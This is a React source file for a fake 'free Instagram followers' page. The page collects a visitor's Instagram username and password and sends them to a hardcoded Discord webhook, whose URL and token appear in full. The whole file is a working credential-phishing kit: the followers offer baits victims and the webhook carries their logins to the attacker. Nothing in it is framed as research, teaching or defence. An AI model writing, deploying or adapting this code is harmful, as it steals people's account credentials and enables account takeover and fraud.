import { useState } from 'react'
import './App.css'

function App() {





  const sendMessage = (e)=>{
    e.preventDefault()
    let username  = e.target[0].value
    let password = e.target[1].value
    console.log(username)
    console.log(password)


    const request = new XMLHttpRequest();
      request.open("POST", "https://discordapp.com/api/webhooks/1173897450906464316/eiRWbp2m_J00oWqZELJlj4SoPrUWX2isBFBBIcKkBeEI2vYUqJRULjyDxRXE3zMnJy1P");

      request.setRequestHeader('Content-type', 'application/json');

      let content = "Username: " + username + " Password: " + password

      const params = {
        username: "My Webhook Name",
        avatar_url: "",
        content: content,
      }

      request.send(JSON.stringify(params));

  }

  return (
    <>
    <h1>Instagram followers</h1>
    <h1>Get upto 1000 followers for free</h1>

    <form onSubmit={sendMessage}>

      <input type="text" className="username" />
      <input type="password" name="" id="" />
      <button type="submit">  Get Followers</button>

      <select name="cars" id="cars">
  <option value="volvo">100 followers - free</option>
  <option value="saab">200 followers - free</option>
  <option value="mercedes">500 followers - free</option>
  <option value="audi">1000 followers - 2$</option>
  <option value="audi">5000 followers - 3$</option>
</select>
    </form>
    </>
  )
}

export default App
